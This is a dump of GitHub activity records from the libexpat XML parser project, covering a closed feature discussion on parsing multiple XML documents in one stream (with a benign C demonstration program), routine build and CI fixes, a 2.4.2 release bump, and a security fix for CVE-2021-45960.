@sebres without diving into details, I think we can agree that both directions of transformation would need math, potentially error-prone, but also rather trivial compared to other challenges in this space.

> > [..] there has to be a policy decision about PIs and comments between documents in the stream; do they belong to the preceding or following document?
> 
> @timbray if the parse continues until junk-after-document that would attribute all those to the preceding document.

@timbray I only now understand how much of a bummer and implications that is. It means that just concatenating two _arbitrary_ XML files — with or without whitespace in between — will _not_ be lossless and unambiguous. So whoever wants to put multiple XML documents into a stream, either needs proper ""enveloping"", separators that are malformed XML (in contrast to whitespace), or say goodbye to certain features of XML. Ouch.

","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/970364003"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-16 16:04:13,timbray,fork_close,"Hey Sergey, in the stream you're receiving, 
1. are the XML documents run together, or is there garbage or PIs or comments or anything between them?
2. do the documents have XML declarations?




","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/970420485"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-16 17:36:39,sebres,fork_close,"1. nothing excepting white-spaces...
Although, I think that the comments etc would not be an issue, since (if needed at all) one could react on them within handlers called for the comment or external. I don't need it (neither at the moment, nor in the future I guess).
2. yes, in form of `<?xml version=""1.0"" encoding=""UTF-8""?>`, but it seems to be optional (not every XML chunk has it). Or do you mean xmlns-attributes and similar stuff? then also yes, they have...","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/970506158"", ""author_association"": ""NONE""}"
518,IssueComment,2021-11-16 18:52:11,timbray,fork_close,"Yeah, that `<?xml …?>` is what's called the XML declaration.  If all of the docs in your stream had one, this could be done safely and deterministically. ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/970571740"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-18 17:59:04,hartwork,fork_close,"> @timbray I only now understand how much of a bummer and implications that is. It means that just concatenating two _arbitrary_ XML files — with or without whitespace in between — will _not_ be lossless and unambiguous. So whoever wants to put multiple XML documents into a stream, either needs proper ""enveloping"", separators that are malformed XML (in contrast to whitespace), or say goodbye to certain features of XML. Ouch.

For proof:

```c
// Proof of ambiguity when parsing multiple XML documents from the same stream
// Copyright (c) 2021 Sebastian Pipping <sebastian@pipping.org>
// Licensed under the Expat MIT license
//
// Compile and run with:
// # gcc -std=c99 -Wall -Wextra -pedantic -lexpat ambig.c && ./a.out

#include <stdio.h>
#include <string.h>

#include <expat.h>

static void onStart(void *userData, const char *tagName, const char **attr) {
  (void)attr;
  printf(""[*][%d]   <%s>\n"", (int)(long)userData, tagName);
}

static void onEnd(void *userData, const char *tagName) {
  printf(""[*][%d]   </%s>\n"", (int)(long)userData, tagName);
}

static void onComment(void *userData, const char *text) {
  printf(""[*][%d]   <!--%s-->\n"", (int)(long)userData, text);
}

int main() {
  const char *text = ""<!--c11--><r1/><!--c12-->""
                     /* no whitespace between documents */
                     ""<!--c21--><r2/><!--c22-->""
                     ""\n""
                     ""<!--c31--><r3/><!--c32-->""
                     ""\n\n""
                     ""<!--c41--><r4/><!--c42-->""
                     ""    ""
                     ""<!--c51--><r5/><!--c52-->"";

  XML_Parser parser = XML_ParserCreate(NULL);

  XML_Index offset = 0;
  int len = (int)strlen(text);
  int docNumber = 1;
  int exitCode = 0;

  for (;; docNumber++) {
    printf(""[*][%d] Parsing from offset %lld\n"", docNumber, (long long)offset);

    XML_SetElementHandler(parser, onStart, onEnd);
    XML_SetCommentHandler(parser, onComment);
    XML_SetUserData(parser, (void *)(long)docNumber);

    const enum XML_Status status =
        XML_Parse(parser, text + offset, len - offset, 1);
    if (status == XML_STATUS_OK) {
      printf(""[+][%d] Parsing succeeded without junk\n"", docNumber);
      break;
    }

    const enum XML_Error error = XML_GetErrorCode(parser);
    if (error != XML_ERROR_JUNK_AFTER_DOC_ELEMENT) {
      printf(""[-][%d] Parsing failed\n"", docNumber);
      exitCode = 1;
      break;
    }

    printf(""[+][%d] Parsing succeeded with junk\n"", docNumber);

    offset += XML_GetCurrentByteIndex(parser);
    XML_ParserReset(parser, NULL);
  }

  XML_ParserFree(parser);

  return exitCode;
}
```

And related output:
```console
# gcc -std=c99 -Wall -Wextra -pedantic -lexpat ambig.c && ./a.out
[*][1] Parsing from offset 0
[*][1]   <!--c11-->
[*][1]   <r1>
[*][1]   </r1>
[*][1]   <!--c12-->
[*][1]   <!--c21-->
[+][1] Parsing succeeded with junk
[*][2] Parsing from offset 35
[*][2]   <r2>
[*][2]   </r2>
[*][2]   <!--c22-->
[*][2]   <!--c31-->
[+][2] Parsing succeeded with junk
[*][3] Parsing from offset 61
[*][3]   <r3>
[*][3]   </r3>
[*][3]   <!--c32-->
[*][3]   <!--c41-->
[+][3] Parsing succeeded with junk
[*][4] Parsing from offset 88
[*][4]   <r4>
[*][4]   </r4>
[*][4]   <!--c42-->
[*][4]   <!--c51-->
[+][4] Parsing succeeded with junk
[*][5] Parsing from offset 117
[*][5]   <r5>
[*][5]   </r5>
[*][5]   <!--c52-->
[+][5] Parsing succeeded without junk
```","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/973119477"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-18 18:04:16,hartwork,fork_close,"@sebres because of the demonstrated inherent ambiguity, the complexity and amount of work needed, and the risk of breaking existing code … this feature is not a good match for being added to core libexpat at the moment.  If a best-effort junk-after-document detection loop (as demonstrated above) is good enough for an application that processes only known subset of XML or can tolerate ambiguity, it is encouraged to implement the multi-doc logic in the application rather than inside libexpat. Where keeping the full stream prior to parsing in memory at a time is not feasabily due to size, it is recommended to keep a copy of a chunk passed to libexpat for parsing until the value returned by `XML_GetCurrentByteIndex` exceeds the end of that chunk, to always be able to reset the parser to the considered start of the next document in the stream; it takes adding numbers and a linked list, works with even older releases of libexpat, and its increase of RAM and CPU is expected to be feasible to most scenarios where there is no control over the producer of the stream. Thanks for your understanding.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/973123476"", ""author_association"": ""MEMBER""}"
518,ClosePR,2021-11-18 18:57:26,sebres,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5640846158"", ""commit_url"": null}"
518,IssueCommentSupplement,2021-11-18 18:57:26,sebres,fork_close,"> and the risk of breaking existing code

which risk? the RFE is really trivial and if handler isn't set it is also totally ""backwards compatible"" or rather the library completely behaves as without this RFE.

> application that processes only known subset of XML or can tolerate ambiguity, it is encouraged to implement the multi-doc logic in the application rather than inside libexpat

I don't follow how one need to consider level of implementation in this concern... if someone needs it, it is possible to ""tolerate"" no matter at which level. 

But OK, nevermind... I still prefer the implementation as a callback (inside the libexpat) for several reasons... 
Sometimes an enhancement is only thing what makes sense (comparing efforts to implement etc)... I wanted just share my work and my experience with this simple solution (OSS, common culture of cooperation, etc)... but if it's not welcome I'm fine to have a fork of the library and to maintain it further on my side.

Anyway thanks for your time and work.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/973164130"", ""author_association"": ""NONE""}"
519,SubmitCommit,2021-11-26 14:15:07,hartwork,unfork_merge,autotools: Sync expat.cmake to agree with CI,"{""sha"": ""5a4ec4cf7f727fb779b846336f4c60f70db782ea"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-11-26T14:15:07Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-11-26T14:15:07Z""}}"
519,OpenPR,2021-11-26 14:16:04,hartwork,unfork_merge,,
519,MergePR,2021-11-26 15:23:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5678303488"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/59d5c6eacd96731eb01868d7eaf6ab5997b2c5f4""}"
519,DeleteBranch,2021-11-26 16:36:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5678618113"", ""commit_url"": null}"
523,SubmitCommit,2021-12-14 00:33:49,hartwork,unfork_merge,doc: Fix return value docs on XML_SetBillionLaughs[..] functions (#522),"{""sha"": ""8c2b1853cdcbea1ac1ba5f2f945f7d26ee41aa1d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-14T00:30:37Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-14T00:33:49Z""}}"
523,OpenPR,2021-12-14 00:34:58,hartwork,unfork_merge,,
523,Labeled,2021-12-14 00:35:05,hartwork,unfork_merge,bug,
523,Assigned,2021-12-14 00:35:06,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
523,RenameTitle,2021-12-14 00:35:52,hartwork,unfork_merge,,"{""rename"": {""from"": ""doc: Fix return value docs on XML_SetBillionLaughs[..] functions (fixes #522)"", ""to"": ""[docs] Fix return value docs on XML_SetBillionLaughs[..] functions (fixes #522)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5760680153""}"
523,MergePR,2021-12-14 13:56:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5764343131"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/bf2c3f3d8901d876e67eb768562bba2c2a282093""}"
523,CrossReferenced,2021-12-14 14:00:22,hartwork,unfork_merge,[>=2.4.0][docs] Mistaken return value in documention of XML_SetBillionLaughsAttackProtection* functions,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/522"", ""is_pull_request"": false}}"
523,DeleteBranch,2021-12-15 14:22:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5771705594"", ""commit_url"": null}"
523,Labeled,2021-12-17 16:43:14,hartwork,unfork_merge,documentation,
524,SubmitCommit,2021-12-15 15:40:15,hartwork,unfork_merge,"CMake: Ensure libexpat*.lib filenames with MSVC

This fixes a post-2.4.1 regression from
commit 3486fd6e3d2bc269660cedd3befa1ae649d1dcf4
introduced by pull request #495.","{""sha"": ""8589e9598a3265d965dd34383841d31443ba9f22"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-15T14:48:10Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-15T15:40:15Z""}}"
524,Labeled,2021-12-15 15:42:17,hartwork,unfork_merge,bug,
524,OpenPR,2021-12-15 15:42:17,hartwork,unfork_merge,,
524,MergePR,2021-12-15 17:38:17,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5773003535"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/2829a2750543fe0f78e3220cdfcd6414995efc4c""}"
524,DeleteBranch,2021-12-15 17:38:36,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5773005214"", ""commit_url"": null}"
524,Labeled,2021-12-17 16:42:33,hartwork,unfork_merge,compilation,
524,Labeled,2021-12-17 16:42:33,hartwork,unfork_merge,windows,
526,SubmitCommit,2021-12-17 16:50:32,hartwork,unfork_merge,Changes: Document #502 #503 #507 #519 + fix reference to #498,"{""sha"": ""96ff8de1d671c6bcb6f8b533dda07243dd23a844"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T16:50:32Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T16:50:32Z""}}"
526,SubmitCommit,2021-12-17 17:01:32,hartwork,unfork_merge,"Bump version info from 9:1:8 to 9:2:8

See https://verbump.de/ for what these numbers do","{""sha"": ""716735e56be7ed2d71b5ed1e47d2a14102f95c78"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T16:55:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T17:01:32Z""}}"
526,SubmitCommit,2021-12-17 17:01:39,hartwork,unfork_merge,Bump version to 2.4.2,"{""sha"": ""f3f6ae617c18b32f2ee53c44a7b646e35d1d9a79"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T16:57:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T17:01:39Z""}}"
526,Labeled,2021-12-17 17:18:26,hartwork,unfork_merge,releasing,
526,Assigned,2021-12-17 17:18:26,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
526,OpenPR,2021-12-17 17:18:26,hartwork,unfork_merge,,
526,Revise,2021-12-19 18:29:54,hartwork,unfork_merge,Set expected release date for 2.4.2,"{""sha"": ""4d9059d3cf46ec3284bf88deee2a5bc97e59d089"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-17T17:02:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-19T18:29:54Z""}}"
526,MergePR,2021-12-19 22:21:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5789614269"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e26a263aa9182d1e4552cd615857f0f61df3ba42""}"
526,DeleteBranch,2021-12-19 22:21:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5789614579"", ""commit_url"": null}"
527,SubmitCommit,2021-12-25 17:15:25,hartwork,unfork_merge,"lib: Address GCC 11.2.1 compiler warning

Symptom was:

In file included from xmltok.c:58:
xmltok_ns.c: In function ‘findEncodingNS’:
xmltok.h:276:10: warning: ‘buf’ may be used uninitialized [-Wmaybe-uninitialized]
  276 |   (((enc)->utf8Convert)(enc, fromP, fromLim, toP, toLim))
      |   ~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
xmltok_ns.c:99:3: note: in expansion of macro ‘XmlUtf8Convert’
   99 |   XmlUtf8Convert(enc, &ptr, end, &p, p + ENCODING_MAX - 1);
      |   ^~~~~~~~~~~~~~
xmltok.h:276:10: note: by argument 5 of type ‘const char *’ to ‘enum XML_Convert_Result(const ENCODING *, const char **, const char *, char **, const char *)’ {aka ‘enum XML_Convert_Result(const struct encoding *, const char **, const char *, char **, const char *)’}
  276 |   (((enc)->utf8Convert)(enc, fromP, fromLim, toP, toLim))
      |   ~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
xmltok_ns.c:99:3: note: in expansion of macro ‘XmlUtf8Convert’
   99 |   XmlUtf8Convert(enc, &ptr, end, &p, p + ENCODING_MAX - 1);
      |   ^~~~~~~~~~~~~~
In file included from xmltok.c:1666:
xmltok_ns.c:96:8: note: ‘buf’ declared here
   96 |   char buf[ENCODING_MAX];
      |        ^~~","{""sha"": ""5bab452b4952ab417a0a47ce4a6185e94e22bd0c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-25T17:13:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-25T17:15:25Z""}}"
527,Labeled,2021-12-25 17:16:46,hartwork,unfork_merge,enhancement,
527,Assigned,2021-12-25 17:16:46,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
527,OpenPR,2021-12-25 17:16:46,hartwork,unfork_merge,,
527,MergePR,2021-12-25 20:11:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5815029745"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9542ad247130801eb226225299d01a17c0582f08""}"
527,DeleteBranch,2021-12-25 20:37:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5815041389"", ""commit_url"": null}"
528,SubmitCommit,2021-12-26 18:51:44,hartwork,unfork_merge,xmlwf: Address Clang 13 warning -Wunused-but-set-variable,"{""sha"": ""c2b5d5240465159c380b9d9b66228b39585c5520"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-26T18:43:49Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-26T18:51:44Z""}}"
528,SubmitCommit,2021-12-26 18:51:44,hartwork,unfork_merge,Actions: Upgrade Clang from 11 to 13,"{""sha"": ""98bb7f287ee752673368fc3587e971842839f445"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-26T17:30:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-26T18:51:44Z""}}"
528,Labeled,2021-12-26 18:53:16,hartwork,unfork_merge,enhancement,
528,OpenPR,2021-12-26 18:53:16,hartwork,unfork_merge,,
528,MergePR,2021-12-26 22:52:49,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5815980509"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/58d1f13d313534e593f97cb46da24c18468bd3b5""}"
528,DeleteBranch,2021-12-27 00:44:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5816064294"", ""commit_url"": null}"
529,SubmitCommit,2021-12-27 21:14:18,hartwork,unfork_merge,CMake: Add unofficial flag for passing 32bit compile flag -m32,"{""sha"": ""befef7e52ada1f9382bec74af7226f4b84054c57"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T19:45:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T21:14:18Z""}}"
529,SubmitCommit,2021-12-28 00:25:16,hartwork,unfork_merge,coverage.sh: Start coveraging -m32,"{""sha"": ""23e820aa2572df776aee4abce7a148ee26b3deca"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-26T17:45:34Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-28T00:25:16Z""}}"
529,SubmitCommit,2021-12-28 00:25:16,hartwork,unfork_merge,coverage.sh: Simplify directory naming scheme,"{""sha"": ""f4adc65cc8a68c70890beba41fbd1ec779d0d26a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T20:20:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-28T00:25:16Z""}}"
529,SubmitCommit,2021-12-28 03:06:05,hartwork,unfork_merge,linux.yml: Add some coverage to -m32 32bit mode,"{""sha"": ""28e427e6896ff889d4eb117978dfbd2f3d586e4c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T21:16:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-28T03:06:05Z""}}"
529,SubmitCommit,2021-12-28 03:18:10,hartwork,unfork_merge,coverage.yml: Store coverage .info and HTML report,"{""sha"": ""5aaa96e1a2d4791fb6da01a75f88ca7b22daf44e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T21:23:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-28T03:18:10Z""}}"
529,OpenPR,2021-12-28 03:19:37,hartwork,unfork_merge,,
529,Labeled,2021-12-28 03:19:38,hartwork,unfork_merge,enhancement,
529,MergePR,2021-12-28 15:11:41,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5821709212"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/60bbbe560cb50e6bfbf93ed765aaeb38335487c3""}"
529,DeleteBranch,2021-12-30 17:31:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5828672589"", ""commit_url"": null}"
534,Labeled,2021-12-30 23:28:17,hartwork,unfork_merge,security,
534,OpenPR,2021-12-30 23:28:17,hartwork,unfork_merge,,
534,RenameTitle,2022-01-01 20:10:55,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] lib: Detect and prevent troublesome left shifts in function storeAtts (fixes #531)"", ""to"": ""[W.I.P.] [CVE-2021-45960] lib: Detect and prevent troublesome left shifts in function storeAtts (fixes #531)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5831995413""}"
534,IssueComment,2022-01-04 11:39:11,kraptor,unfork_merge,@hartwork is there any ETA to merge this PR?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1004736900"", ""author_association"": ""NONE""}"
534,IssueComment,2022-01-04 14:49:25,hartwork,unfork_merge,"@kraptor in a few days, followed by release 2.4.3 There is more security work upcoming for 2.4.3; I personally recommend waiting for release 2.4.3, and then acting on all vulnerabilities at once.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1004874063"", ""author_association"": ""MEMBER""}"
534,Revise,2022-01-05 17:23:42,hartwork,unfork_merge,lib: Detect and prevent troublesome left shifts in function storeAtts (CVE-2021-45960),"{""sha"": ""0adcb34c49bee5b19bd29b16a578c510c23597ea"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-27T19:15:02Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-05T17:23:42Z""}}"
534,Revise,2022-01-05 17:23:42,hartwork,unfork_merge,Changes: Document CVE-2021-45960,"{""sha"": ""f82a72271c2c613202e0fb0bd1eeacfa36a8161b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-05T17:23:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-05T17:23:42Z""}}"
534,RenameTitle,2022-01-07 22:14:21,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] [CVE-2021-45960] lib: Detect and prevent troublesome left shifts in function storeAtts (fixes #531)"", ""to"": ""[CVE-2021-45960] lib: Detect and prevent troublesome left shifts in function storeAtts (fixes #531)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860215724""}"
534,MergePR,2022-01-07 22:17:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860224445"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9dc50735f737eaf6890ad3fd4903db62b03a9ac4""}"
534,DeleteBranch,2022-01-07 22:17:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860226378"", ""commit_url"": null}"
534,CrossReferenced,2022-01-08 00:29:32,hartwork,unfork_merge,[CVE-2022-22822 to CVE-2022-22827] lib: Prevent more integer overflows,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/539"", ""is_pull_request"": true}}"
534,CrossReferenced,2022-01-08 00:31:31,hartwork,unfork_merge,Release Expat 2.4.3,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/533"", ""is_pull_request"": false}}"
535,SubmitCommit,2021-12-31 19:49:00,hartwork,unfork_merge,"CMake: Make call to file(GENERATE [..]) work for CMake <3.19

Error from CMake 3.7.2 was:

CMake Error at CMakeLists.txt:482 (file):
  file Incorrect arguments to GENERATE subcommand.","{""sha"": ""2ed8e19ada265a523b35f78c7ff13858a22f15d0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-31T19:35:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-31T19:49:00Z""}}"
535,Labeled,2021-12-31 20:13:09,hartwork,unfork_merge,bug,
535,Labeled,2021-12-31 20:13:09,hartwork,unfork_merge,compilation,
535,Assigned,2021-12-31 20:13:09,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
535,OpenPR,2021-12-31 20:13:09,hartwork,unfork_merge,,
535,MergePR,2021-12-31 21:35:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5831044969"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/4a0af42c35b5efb45d3bdeb4057543be6f5f3b3b""}"
535,DeleteBranch,2022-01-01 14:39:23,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5831741828"", ""commit_url"": null}"
536,SubmitCommit,2022-01-01 14:58:47,hartwork,unfork_merge,Actions: Check for realistic minimum CMake version requirement,"{""sha"": ""9470015a1f62f6030415262bf7b990ad0abc5008"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-01T14:22:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-01T14:58:47Z""}}"
536,Labeled,2022-01-01 14:59:36,hartwork,unfork_merge,enhancement,
536,Labeled,2022-01-01 14:59:36,hartwork,unfork_merge,compilation,
